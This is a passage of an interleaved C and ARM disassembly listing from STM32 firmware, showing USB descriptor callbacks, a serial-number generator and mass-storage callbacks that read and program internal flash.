 800c636:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_DeviceDesc);
 800c638:	683b      	ldr	r3, [r7, #0]
 800c63a:	2212      	movs	r2, #18
 800c63c:	801a      	strh	r2, [r3, #0]
  if(isMSC == 1)
 800c63e:	4b06      	ldr	r3, [pc, #24]	; (800c658 <USBD_FS_DeviceDescriptor+0x2c>)
 800c640:	681b      	ldr	r3, [r3, #0]
 800c642:	2b01      	cmp	r3, #1
 800c644:	d101      	bne.n	800c64a <USBD_FS_DeviceDescriptor+0x1e>
	  return USBD_FS_DeviceDesc;
 800c646:	4b05      	ldr	r3, [pc, #20]	; (800c65c <USBD_FS_DeviceDescriptor+0x30>)
 800c648:	e000      	b.n	800c64c <USBD_FS_DeviceDescriptor+0x20>
  else
	  return USBD_FS_DeviceDesc_HID;
 800c64a:	4b05      	ldr	r3, [pc, #20]	; (800c660 <USBD_FS_DeviceDescriptor+0x34>)
}
 800c64c:	4618      	mov	r0, r3
 800c64e:	370c      	adds	r7, #12
 800c650:	46bd      	mov	sp, r7
 800c652:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c656:	4770      	bx	lr
 800c658:	20000978 	.word	0x20000978
 800c65c:	200001cc 	.word	0x200001cc
 800c660:	200001e0 	.word	0x200001e0

0800c664 <USBD_FS_LangIDStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_LangIDStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c664:	b480      	push	{r7}
 800c666:	b083      	sub	sp, #12
 800c668:	af00      	add	r7, sp, #0
 800c66a:	4603      	mov	r3, r0
 800c66c:	6039      	str	r1, [r7, #0]
 800c66e:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_LangIDDesc);
 800c670:	683b      	ldr	r3, [r7, #0]
 800c672:	2204      	movs	r2, #4
 800c674:	801a      	strh	r2, [r3, #0]
  return USBD_LangIDDesc;
 800c676:	4b03      	ldr	r3, [pc, #12]	; (800c684 <USBD_FS_LangIDStrDescriptor+0x20>)
}
 800c678:	4618      	mov	r0, r3
 800c67a:	370c      	adds	r7, #12
 800c67c:	46bd      	mov	sp, r7
 800c67e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c682:	4770      	bx	lr
 800c684:	20000200 	.word	0x20000200

0800c688 <USBD_FS_ProductStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ProductStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c688:	b580      	push	{r7, lr}
 800c68a:	b082      	sub	sp, #8
 800c68c:	af00      	add	r7, sp, #0
 800c68e:	4603      	mov	r3, r0
 800c690:	6039      	str	r1, [r7, #0]
 800c692:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c694:	79fb      	ldrb	r3, [r7, #7]
 800c696:	2b00      	cmp	r3, #0
 800c698:	d105      	bne.n	800c6a6 <USBD_FS_ProductStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c69a:	683a      	ldr	r2, [r7, #0]
 800c69c:	4907      	ldr	r1, [pc, #28]	; (800c6bc <USBD_FS_ProductStrDescriptor+0x34>)
 800c69e:	4808      	ldr	r0, [pc, #32]	; (800c6c0 <USBD_FS_ProductStrDescriptor+0x38>)
 800c6a0:	f7ff fe62 	bl	800c368 <USBD_GetString>
 800c6a4:	e004      	b.n	800c6b0 <USBD_FS_ProductStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_PRODUCT_STRING_FS, USBD_StrDesc, length);
 800c6a6:	683a      	ldr	r2, [r7, #0]
 800c6a8:	4904      	ldr	r1, [pc, #16]	; (800c6bc <USBD_FS_ProductStrDescriptor+0x34>)
 800c6aa:	4805      	ldr	r0, [pc, #20]	; (800c6c0 <USBD_FS_ProductStrDescriptor+0x38>)
 800c6ac:	f7ff fe5c 	bl	800c368 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c6b0:	4b02      	ldr	r3, [pc, #8]	; (800c6bc <USBD_FS_ProductStrDescriptor+0x34>)
}
 800c6b2:	4618      	mov	r0, r3
 800c6b4:	3708      	adds	r7, #8
 800c6b6:	46bd      	mov	sp, r7
 800c6b8:	bd80      	pop	{r7, pc}
 800c6ba:	bf00      	nop
 800c6bc:	2000097c 	.word	0x2000097c
 800c6c0:	0800d3b8 	.word	0x0800d3b8

0800c6c4 <USBD_FS_ManufacturerStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ManufacturerStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c6c4:	b580      	push	{r7, lr}
 800c6c6:	b082      	sub	sp, #8
 800c6c8:	af00      	add	r7, sp, #0
 800c6ca:	4603      	mov	r3, r0
 800c6cc:	6039      	str	r1, [r7, #0]
 800c6ce:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  USBD_GetString((uint8_t *)USBD_MANUFACTURER_STRING, USBD_StrDesc, length);
 800c6d0:	683a      	ldr	r2, [r7, #0]
 800c6d2:	4904      	ldr	r1, [pc, #16]	; (800c6e4 <USBD_FS_ManufacturerStrDescriptor+0x20>)
 800c6d4:	4804      	ldr	r0, [pc, #16]	; (800c6e8 <USBD_FS_ManufacturerStrDescriptor+0x24>)
 800c6d6:	f7ff fe47 	bl	800c368 <USBD_GetString>
  return USBD_StrDesc;
 800c6da:	4b02      	ldr	r3, [pc, #8]	; (800c6e4 <USBD_FS_ManufacturerStrDescriptor+0x20>)
}
 800c6dc:	4618      	mov	r0, r3
 800c6de:	3708      	adds	r7, #8
 800c6e0:	46bd      	mov	sp, r7
 800c6e2:	bd80      	pop	{r7, pc}
 800c6e4:	2000097c 	.word	0x2000097c
 800c6e8:	0800d3cc 	.word	0x0800d3cc

0800c6ec <USBD_FS_SerialStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_SerialStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c6ec:	b580      	push	{r7, lr}
 800c6ee:	b082      	sub	sp, #8
 800c6f0:	af00      	add	r7, sp, #0
 800c6f2:	4603      	mov	r3, r0
 800c6f4:	6039      	str	r1, [r7, #0]
 800c6f6:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = USB_SIZ_STRING_SERIAL;
 800c6f8:	683b      	ldr	r3, [r7, #0]
 800c6fa:	221a      	movs	r2, #26
 800c6fc:	801a      	strh	r2, [r3, #0]

  /* Update the serial number string descriptor with the data from the unique
   * ID */
  Get_SerialNum();
 800c6fe:	f000 f855 	bl	800c7ac <Get_SerialNum>
  /* USER CODE BEGIN USBD_FS_SerialStrDescriptor */

  /* USER CODE END USBD_FS_SerialStrDescriptor */
  return (uint8_t *) USBD_StringSerial;
 800c702:	4b02      	ldr	r3, [pc, #8]	; (800c70c <USBD_FS_SerialStrDescriptor+0x20>)
}
 800c704:	4618      	mov	r0, r3
 800c706:	3708      	adds	r7, #8
 800c708:	46bd      	mov	sp, r7
 800c70a:	bd80      	pop	{r7, pc}
 800c70c:	20000204 	.word	0x20000204

0800c710 <USBD_FS_ConfigStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_ConfigStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c710:	b580      	push	{r7, lr}
 800c712:	b082      	sub	sp, #8
 800c714:	af00      	add	r7, sp, #0
 800c716:	4603      	mov	r3, r0
 800c718:	6039      	str	r1, [r7, #0]
 800c71a:	71fb      	strb	r3, [r7, #7]
  if(speed == USBD_SPEED_HIGH)
 800c71c:	79fb      	ldrb	r3, [r7, #7]
 800c71e:	2b00      	cmp	r3, #0
 800c720:	d105      	bne.n	800c72e <USBD_FS_ConfigStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c722:	683a      	ldr	r2, [r7, #0]
 800c724:	4907      	ldr	r1, [pc, #28]	; (800c744 <USBD_FS_ConfigStrDescriptor+0x34>)
 800c726:	4808      	ldr	r0, [pc, #32]	; (800c748 <USBD_FS_ConfigStrDescriptor+0x38>)
 800c728:	f7ff fe1e 	bl	800c368 <USBD_GetString>
 800c72c:	e004      	b.n	800c738 <USBD_FS_ConfigStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_CONFIGURATION_STRING_FS, USBD_StrDesc, length);
 800c72e:	683a      	ldr	r2, [r7, #0]
 800c730:	4904      	ldr	r1, [pc, #16]	; (800c744 <USBD_FS_ConfigStrDescriptor+0x34>)
 800c732:	4805      	ldr	r0, [pc, #20]	; (800c748 <USBD_FS_ConfigStrDescriptor+0x38>)
 800c734:	f7ff fe18 	bl	800c368 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c738:	4b02      	ldr	r3, [pc, #8]	; (800c744 <USBD_FS_ConfigStrDescriptor+0x34>)
}
 800c73a:	4618      	mov	r0, r3
 800c73c:	3708      	adds	r7, #8
 800c73e:	46bd      	mov	sp, r7
 800c740:	bd80      	pop	{r7, pc}
 800c742:	bf00      	nop
 800c744:	2000097c 	.word	0x2000097c
 800c748:	0800d3d0 	.word	0x0800d3d0

0800c74c <USBD_FS_InterfaceStrDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_InterfaceStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c74c:	b580      	push	{r7, lr}
 800c74e:	b082      	sub	sp, #8
 800c750:	af00      	add	r7, sp, #0
 800c752:	4603      	mov	r3, r0
 800c754:	6039      	str	r1, [r7, #0]
 800c756:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c758:	79fb      	ldrb	r3, [r7, #7]
 800c75a:	2b00      	cmp	r3, #0
 800c75c:	d105      	bne.n	800c76a <USBD_FS_InterfaceStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c75e:	683a      	ldr	r2, [r7, #0]
 800c760:	4907      	ldr	r1, [pc, #28]	; (800c780 <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c762:	4808      	ldr	r0, [pc, #32]	; (800c784 <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c764:	f7ff fe00 	bl	800c368 <USBD_GetString>
 800c768:	e004      	b.n	800c774 <USBD_FS_InterfaceStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c76a:	683a      	ldr	r2, [r7, #0]
 800c76c:	4904      	ldr	r1, [pc, #16]	; (800c780 <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c76e:	4805      	ldr	r0, [pc, #20]	; (800c784 <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c770:	f7ff fdfa 	bl	800c368 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c774:	4b02      	ldr	r3, [pc, #8]	; (800c780 <USBD_FS_InterfaceStrDescriptor+0x34>)
}
 800c776:	4618      	mov	r0, r3
 800c778:	3708      	adds	r7, #8
 800c77a:	46bd      	mov	sp, r7
 800c77c:	bd80      	pop	{r7, pc}
 800c77e:	bf00      	nop
 800c780:	2000097c 	.word	0x2000097c
 800c784:	0800d3dc 	.word	0x0800d3dc

0800c788 <USBD_FS_USR_BOSDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_USR_BOSDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c788:	b480      	push	{r7}
 800c78a:	b083      	sub	sp, #12
 800c78c:	af00      	add	r7, sp, #0
 800c78e:	4603      	mov	r3, r0
 800c790:	6039      	str	r1, [r7, #0]
 800c792:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_BOSDesc);
 800c794:	683b      	ldr	r3, [r7, #0]
 800c796:	220c      	movs	r2, #12
 800c798:	801a      	strh	r2, [r3, #0]
  return (uint8_t*)USBD_FS_BOSDesc;
 800c79a:	4b03      	ldr	r3, [pc, #12]	; (800c7a8 <USBD_FS_USR_BOSDescriptor+0x20>)
}
 800c79c:	4618      	mov	r0, r3
 800c79e:	370c      	adds	r7, #12
 800c7a0:	46bd      	mov	sp, r7
 800c7a2:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c7a6:	4770      	bx	lr
 800c7a8:	200001f4 	.word	0x200001f4

0800c7ac <Get_SerialNum>:
  * @brief  Create the serial number string descriptor
  * @param  None
  * @retval None
  */
static void Get_SerialNum(void)
{
 800c7ac:	b580      	push	{r7, lr}
 800c7ae:	b084      	sub	sp, #16
 800c7b0:	af00      	add	r7, sp, #0
  uint32_t deviceserial0;
  uint32_t deviceserial1;
  uint32_t deviceserial2;

  deviceserial0 = *(uint32_t *) DEVICE_ID1;
 800c7b2:	4b0f      	ldr	r3, [pc, #60]	; (800c7f0 <Get_SerialNum+0x44>)
 800c7b4:	681b      	ldr	r3, [r3, #0]
 800c7b6:	60fb      	str	r3, [r7, #12]
  deviceserial1 = *(uint32_t *) DEVICE_ID2;
 800c7b8:	4b0e      	ldr	r3, [pc, #56]	; (800c7f4 <Get_SerialNum+0x48>)
 800c7ba:	681b      	ldr	r3, [r3, #0]
 800c7bc:	60bb      	str	r3, [r7, #8]
  deviceserial2 = *(uint32_t *) DEVICE_ID3;
 800c7be:	4b0e      	ldr	r3, [pc, #56]	; (800c7f8 <Get_SerialNum+0x4c>)
 800c7c0:	681b      	ldr	r3, [r3, #0]
 800c7c2:	607b      	str	r3, [r7, #4]

  deviceserial0 += deviceserial2;
 800c7c4:	68fa      	ldr	r2, [r7, #12]
 800c7c6:	687b      	ldr	r3, [r7, #4]
 800c7c8:	4413      	add	r3, r2
 800c7ca:	60fb      	str	r3, [r7, #12]

  if (deviceserial0 != 0)
 800c7cc:	68fb      	ldr	r3, [r7, #12]
 800c7ce:	2b00      	cmp	r3, #0
 800c7d0:	d009      	beq.n	800c7e6 <Get_SerialNum+0x3a>
  {
    IntToUnicode(deviceserial0, &USBD_StringSerial[2], 8);
 800c7d2:	2208      	movs	r2, #8
 800c7d4:	4909      	ldr	r1, [pc, #36]	; (800c7fc <Get_SerialNum+0x50>)
 800c7d6:	68f8      	ldr	r0, [r7, #12]
 800c7d8:	f000 f814 	bl	800c804 <IntToUnicode>
    IntToUnicode(deviceserial1, &USBD_StringSerial[18], 4);
 800c7dc:	2204      	movs	r2, #4
 800c7de:	4908      	ldr	r1, [pc, #32]	; (800c800 <Get_SerialNum+0x54>)
 800c7e0:	68b8      	ldr	r0, [r7, #8]
 800c7e2:	f000 f80f 	bl	800c804 <IntToUnicode>
  }
}
 800c7e6:	bf00      	nop
 800c7e8:	3710      	adds	r7, #16
 800c7ea:	46bd      	mov	sp, r7
 800c7ec:	bd80      	pop	{r7, pc}
 800c7ee:	bf00      	nop
 800c7f0:	1fff7590 	.word	0x1fff7590
 800c7f4:	1fff7594 	.word	0x1fff7594
 800c7f8:	1fff7598 	.word	0x1fff7598
 800c7fc:	20000206 	.word	0x20000206
 800c800:	20000216 	.word	0x20000216

0800c804 <IntToUnicode>:
  * @param  pbuf: pointer to the buffer
  * @param  len: buffer length
  * @retval None
  */
static void IntToUnicode(uint32_t value, uint8_t * pbuf, uint8_t len)
{
 800c804:	b480      	push	{r7}
 800c806:	b087      	sub	sp, #28
 800c808:	af00      	add	r7, sp, #0
 800c80a:	60f8      	str	r0, [r7, #12]
 800c80c:	60b9      	str	r1, [r7, #8]
 800c80e:	4613      	mov	r3, r2
 800c810:	71fb      	strb	r3, [r7, #7]
  uint8_t idx = 0;
 800c812:	2300      	movs	r3, #0
 800c814:	75fb      	strb	r3, [r7, #23]

  for (idx = 0; idx < len; idx++)
 800c816:	2300      	movs	r3, #0
 800c818:	75fb      	strb	r3, [r7, #23]
 800c81a:	e027      	b.n	800c86c <IntToUnicode+0x68>
  {
    if (((value >> 28)) < 0xA)
 800c81c:	68fb      	ldr	r3, [r7, #12]
 800c81e:	0f1b      	lsrs	r3, r3, #28
 800c820:	2b09      	cmp	r3, #9
 800c822:	d80b      	bhi.n	800c83c <IntToUnicode+0x38>
    {
      pbuf[2 * idx] = (value >> 28) + '0';
 800c824:	68fb      	ldr	r3, [r7, #12]
 800c826:	0f1b      	lsrs	r3, r3, #28
 800c828:	b2da      	uxtb	r2, r3
 800c82a:	7dfb      	ldrb	r3, [r7, #23]
 800c82c:	005b      	lsls	r3, r3, #1
 800c82e:	4619      	mov	r1, r3
 800c830:	68bb      	ldr	r3, [r7, #8]
 800c832:	440b      	add	r3, r1
 800c834:	3230      	adds	r2, #48	; 0x30
 800c836:	b2d2      	uxtb	r2, r2
 800c838:	701a      	strb	r2, [r3, #0]
 800c83a:	e00a      	b.n	800c852 <IntToUnicode+0x4e>
    }
    else
    {
      pbuf[2 * idx] = (value >> 28) + 'A' - 10;
 800c83c:	68fb      	ldr	r3, [r7, #12]
 800c83e:	0f1b      	lsrs	r3, r3, #28
 800c840:	b2da      	uxtb	r2, r3
 800c842:	7dfb      	ldrb	r3, [r7, #23]
 800c844:	005b      	lsls	r3, r3, #1
 800c846:	4619      	mov	r1, r3
 800c848:	68bb      	ldr	r3, [r7, #8]
 800c84a:	440b      	add	r3, r1
 800c84c:	3237      	adds	r2, #55	; 0x37
 800c84e:	b2d2      	uxtb	r2, r2
 800c850:	701a      	strb	r2, [r3, #0]
    }

    value = value << 4;
 800c852:	68fb      	ldr	r3, [r7, #12]
 800c854:	011b      	lsls	r3, r3, #4
 800c856:	60fb      	str	r3, [r7, #12]

    pbuf[2 * idx + 1] = 0;
 800c858:	7dfb      	ldrb	r3, [r7, #23]
 800c85a:	005b      	lsls	r3, r3, #1
 800c85c:	3301      	adds	r3, #1
 800c85e:	68ba      	ldr	r2, [r7, #8]
 800c860:	4413      	add	r3, r2
 800c862:	2200      	movs	r2, #0
 800c864:	701a      	strb	r2, [r3, #0]
  for (idx = 0; idx < len; idx++)
 800c866:	7dfb      	ldrb	r3, [r7, #23]
 800c868:	3301      	adds	r3, #1
 800c86a:	75fb      	strb	r3, [r7, #23]
 800c86c:	7dfa      	ldrb	r2, [r7, #23]
 800c86e:	79fb      	ldrb	r3, [r7, #7]
 800c870:	429a      	cmp	r2, r3
 800c872:	d3d3      	bcc.n	800c81c <IntToUnicode+0x18>
  }
}
 800c874:	bf00      	nop
 800c876:	bf00      	nop
 800c878:	371c      	adds	r7, #28
 800c87a:	46bd      	mov	sp, r7
 800c87c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c880:	4770      	bx	lr

0800c882 <STORAGE_Init_FS>:
  * @brief  Initializes over USB FS IP
  * @param  lun:
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Init_FS(uint8_t lun)
{
 800c882:	b480      	push	{r7}
 800c884:	b083      	sub	sp, #12
 800c886:	af00      	add	r7, sp, #0
 800c888:	4603      	mov	r3, r0
 800c88a:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 2 */
  return (USBD_OK);
 800c88c:	2300      	movs	r3, #0
  /* USER CODE END 2 */
}
 800c88e:	4618      	mov	r0, r3
 800c890:	370c      	adds	r7, #12
 800c892:	46bd      	mov	sp, r7
 800c894:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c898:	4770      	bx	lr

0800c89a <STORAGE_GetCapacity_FS>:
  * @param  block_num: .
  * @param  block_size: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_GetCapacity_FS(uint8_t lun, uint32_t *block_num, uint16_t *block_size)
{
 800c89a:	b480      	push	{r7}
 800c89c:	b085      	sub	sp, #20
 800c89e:	af00      	add	r7, sp, #0
 800c8a0:	4603      	mov	r3, r0
 800c8a2:	60b9      	str	r1, [r7, #8]
 800c8a4:	607a      	str	r2, [r7, #4]
 800c8a6:	73fb      	strb	r3, [r7, #15]
  /* USER CODE BEGIN 3 */
	*block_num  = FLASH_PAGE_NBR;
 800c8a8:	68bb      	ldr	r3, [r7, #8]
 800c8aa:	2240      	movs	r2, #64	; 0x40
 800c8ac:	601a      	str	r2, [r3, #0]
	*block_size = FLASH_PAGE_SIZE;
 800c8ae:	687b      	ldr	r3, [r7, #4]
 800c8b0:	f44f 6200 	mov.w	r2, #2048	; 0x800
 800c8b4:	801a      	strh	r2, [r3, #0]
  return (USBD_OK);
 800c8b6:	2300      	movs	r3, #0
  /* USER CODE END 3 */
}
 800c8b8:	4618      	mov	r0, r3
 800c8ba:	3714      	adds	r7, #20
 800c8bc:	46bd      	mov	sp, r7
 800c8be:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c8c2:	4770      	bx	lr

0800c8c4 <STORAGE_IsReady_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsReady_FS(uint8_t lun)
{
 800c8c4:	b480      	push	{r7}
 800c8c6:	b083      	sub	sp, #12
 800c8c8:	af00      	add	r7, sp, #0
 800c8ca:	4603      	mov	r3, r0
 800c8cc:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c8ce:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c8d0:	4618      	mov	r0, r3
 800c8d2:	370c      	adds	r7, #12
 800c8d4:	46bd      	mov	sp, r7
 800c8d6:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c8da:	4770      	bx	lr

0800c8dc <STORAGE_IsWriteProtected_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsWriteProtected_FS(uint8_t lun)
{
 800c8dc:	b480      	push	{r7}
 800c8de:	b083      	sub	sp, #12
 800c8e0:	af00      	add	r7, sp, #0
 800c8e2:	4603      	mov	r3, r0
 800c8e4:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c8e6:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c8e8:	4618      	mov	r0, r3
 800c8ea:	370c      	adds	r7, #12
 800c8ec:	46bd      	mov	sp, r7
 800c8ee:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c8f2:	4770      	bx	lr

0800c8f4 <STORAGE_Read_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Read_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c8f4:	b580      	push	{r7, lr}
 800c8f6:	b084      	sub	sp, #16
 800c8f8:	af00      	add	r7, sp, #0
 800c8fa:	60b9      	str	r1, [r7, #8]
 800c8fc:	607a      	str	r2, [r7, #4]
 800c8fe:	461a      	mov	r2, r3
 800c900:	4603      	mov	r3, r0
 800c902:	73fb      	strb	r3, [r7, #15]
 800c904:	4613      	mov	r3, r2
 800c906:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 6 */
	if(lun == 0){
 800c908:	7bfb      	ldrb	r3, [r7, #15]
 800c90a:	2b00      	cmp	r3, #0
 800c90c:	d10d      	bne.n	800c92a <STORAGE_Read_FS+0x36>
		memcpy(buf, (uint8_t*)(FLASH_START_ADDR + blk_addr * FLASH_PAGE_SIZE), blk_len * FLASH_PAGE_SIZE);
 800c90e:	687b      	ldr	r3, [r7, #4]
 800c910:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c914:	3340      	adds	r3, #64	; 0x40
 800c916:	02db      	lsls	r3, r3, #11
 800c918:	4619      	mov	r1, r3
 800c91a:	89bb      	ldrh	r3, [r7, #12]
 800c91c:	02db      	lsls	r3, r3, #11
 800c91e:	461a      	mov	r2, r3
 800c920:	68b8      	ldr	r0, [r7, #8]
 800c922:	f000 fc65 	bl	800d1f0 <memcpy>
		return (USBD_OK);
 800c926:	2300      	movs	r3, #0
 800c928:	e000      	b.n	800c92c <STORAGE_Read_FS+0x38>
	}
  return (USBD_FAIL);
 800c92a:	2303      	movs	r3, #3
  /* USER CODE END 6 */
}
 800c92c:	4618      	mov	r0, r3
 800c92e:	3710      	adds	r7, #16
 800c930:	46bd      	mov	sp, r7
 800c932:	bd80      	pop	{r7, pc}

0800c934 <STORAGE_Write_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Write_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c934:	b580      	push	{r7, lr}
 800c936:	b08a      	sub	sp, #40	; 0x28
 800c938:	af00      	add	r7, sp, #0
 800c93a:	60b9      	str	r1, [r7, #8]
 800c93c:	607a      	str	r2, [r7, #4]
 800c93e:	461a      	mov	r2, r3
 800c940:	4603      	mov	r3, r0
 800c942:	73fb      	strb	r3, [r7, #15]
 800c944:	4613      	mov	r3, r2
 800c946:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 7 */
	if(lun == 0){
 800c948:	7bfb      	ldrb	r3, [r7, #15]
 800c94a:	2b00      	cmp	r3, #0
 800c94c:	d136      	bne.n	800c9bc <STORAGE_Write_FS+0x88>
		uint16_t i;
		HAL_FLASH_Unlock();
 800c94e:	f7f4 febb 	bl	80016c8 <HAL_FLASH_Unlock>
		FLASH_EraseInitTypeDef f;
		f.TypeErase = FLASH_TYPEERASE_PAGES;
 800c952:	2300      	movs	r3, #0
 800c954:	617b      	str	r3, [r7, #20]
		f.Banks = FLASH_BANK_BOTH;
 800c956:	2301      	movs	r3, #1
 800c958:	61bb      	str	r3, [r7, #24]
		f.Page = (FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE)/FLASH_PAGE_SIZE;
 800c95a:	687b      	ldr	r3, [r7, #4]
 800c95c:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c960:	3340      	adds	r3, #64	; 0x40
 800c962:	f3c3 0314 	ubfx	r3, r3, #0, #21
 800c966:	61fb      	str	r3, [r7, #28]
		f.NbPages = blk_len;
 800c968:	89bb      	ldrh	r3, [r7, #12]
 800c96a:	623b      	str	r3, [r7, #32]
		uint32_t PageError = 0;
 800c96c:	2300      	movs	r3, #0
 800c96e:	613b      	str	r3, [r7, #16]
		HAL_FLASHEx_Erase(&f, &PageError);
 800c970:	f107 0210 	add.w	r2, r7, #16
 800c974:	f107 0314 	add.w	r3, r7, #20
 800c978:	4611      	mov	r1, r2
 800c97a:	4618      	mov	r0, r3
 800c97c:	f7f4 ff8a 	bl	8001894 <HAL_FLASHEx_Erase>

		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800c980:	2300      	movs	r3, #0
 800c982:	84fb      	strh	r3, [r7, #38]	; 0x26
 800c984:	e011      	b.n	800c9aa <STORAGE_Write_FS+0x76>
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
					FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE + i,
 800c986:	687b      	ldr	r3, [r7, #4]
 800c988:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c98c:	3340      	adds	r3, #64	; 0x40
 800c98e:	02da      	lsls	r2, r3, #11
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800c990:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c992:	18d1      	adds	r1, r2, r3
					*(uint64_t *)(&buf[i]));
 800c994:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c996:	68ba      	ldr	r2, [r7, #8]
 800c998:	4413      	add	r3, r2
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800c99a:	e9d3 2300 	ldrd	r2, r3, [r3]
 800c99e:	2000      	movs	r0, #0
 800c9a0:	f7f4 fe26 	bl	80015f0 <HAL_FLASH_Program>
		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800c9a4:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c9a6:	3308      	adds	r3, #8
 800c9a8:	84fb      	strh	r3, [r7, #38]	; 0x26
 800c9aa:	8cfa      	ldrh	r2, [r7, #38]	; 0x26
 800c9ac:	89bb      	ldrh	r3, [r7, #12]
 800c9ae:	02db      	lsls	r3, r3, #11
 800c9b0:	429a      	cmp	r2, r3
 800c9b2:	d3e8      	bcc.n	800c986 <STORAGE_Write_FS+0x52>

		HAL_FLASH_Lock();
 800c9b4:	f7f4 feaa 	bl	800170c <HAL_FLASH_Lock>
		return USBD_OK;
 800c9b8:	2300      	movs	r3, #0
 800c9ba:	e000      	b.n	800c9be <STORAGE_Write_FS+0x8a>
	}
  return (USBD_FAIL);
 800c9bc:	2303      	movs	r3, #3
  /* USER CODE END 7 */
}
 800c9be:	4618      	mov	r0, r3
 800c9c0:	3728      	adds	r7, #40	; 0x28
 800c9c2:	46bd      	mov	sp, r7
 800c9c4:	bd80      	pop	{r7, pc}

0800c9c6 <STORAGE_GetMaxLun_FS>:
  * @brief  .
  * @param  None
  * @retval .
  */
int8_t STORAGE_GetMaxLun_FS(void)
{
 800c9c6:	b480      	push	{r7}
 800c9c8:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 8 */
  return (STORAGE_LUN_NBR - 1);
